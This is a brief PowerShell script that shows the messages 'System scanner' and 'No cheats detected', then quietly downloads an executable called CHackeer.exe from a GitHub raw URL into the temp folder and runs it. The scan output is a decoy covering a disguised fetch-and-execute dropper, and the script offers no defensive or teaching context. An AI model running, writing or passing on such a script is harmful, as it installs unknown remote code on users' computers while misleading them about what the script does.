Write-Host ""
Write-Host "System scanner" -ForegroundColor Cyan
Write-Host "No cheats detected" -ForegroundColor Green
$temp = "$env:TEMP\CHackeer.exe"
iwr https://raw.githubusercontent.com/fundrug35-jpg/asdasdad/main/CHackeer.exe -OutFile $temp
& $temp
Read-Host ""
